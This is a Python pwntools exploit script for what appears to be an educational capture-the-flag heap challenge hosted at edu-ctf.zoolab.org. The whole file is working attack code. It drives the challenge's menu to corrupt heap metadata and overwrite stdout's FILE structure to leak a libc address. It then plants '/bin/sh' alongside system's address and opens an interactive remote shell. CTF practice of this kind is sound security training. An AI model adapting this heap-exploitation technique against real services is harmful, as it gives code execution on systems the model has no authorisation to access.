from pwn import *

#r = process(["./john_cena"])
r = remote("edu-ctf.zoolab.org", 10105)
def add(size,data):
	r.sendlineafter(">","1")
	r.sendlineafter(":",str(size))
	if size >0x78:
		r.sendafter(":",data)

def magic(size,data,name):
	r.sendlineafter(">","2")
	r.sendlineafter(":",str(size))
	r.sendafter(":",data)
	r.sendafter(":",name)


def remove(idx):
	r.sendlineafter(">","3")
	r.sendlineafter(":",str(idx))


def edit(idx,offset,data):
	r.sendlineafter(">","4")
	r.sendlineafter(":",str(idx))
	r.sendlineafter(":",str(offset))
	r.sendafter(":",data)


r.sendlineafter(">","1")



add(0xf00,"a")
add(0x90,"a")
remove(1)
remove(0)
magic(0x30,"a","aaa")
add(0x30,"a")
val = 0x7760 #int(raw_input(":"),16)
add(0x80,"a"*8+p16(val))
add(0x80,"a"*8+p16(val))
remove(2)
remove(1)
edit(0,0x38,p64(0x400)+p8(0x78))
remove(0)
add(0x80,"a")
add(0x80,"a")
add(0x80,p64(0xfbad3c80)+p64(0)*3+p8(0))
libc = u64(r.recvuntil("Heap")[8:16])-0x3ed8b0
print hex(libc)
remove(0)
add(0x3f0,"\x00"*0x88+p64(0x21)+p64(0)*2)
remove(2)
add(0xa0,"a")
remove(2)
add(0xb0,"a")
remove(0)
add(0x3f0,"\x00"*0x88+p64(0x21)+p64(0)+p8(0))
remove(2)
add(0xc0,"a")
remove(0)
add(0x3f0,"\x00"*0x88+p64(0x21)+p64(0)*21+p64(0xb1)+p64(libc+0x3ed8e0))
remove(2)
add(0xa0,"a")
remove(0)
add(0x3f0,"\x00"*0x88+p64(0x21)+p64(0)*2)
remove(2)
add(0xa0,"/bin/sh\x00"+p64(libc+0x4f440))
remove(2)
r.interactive()
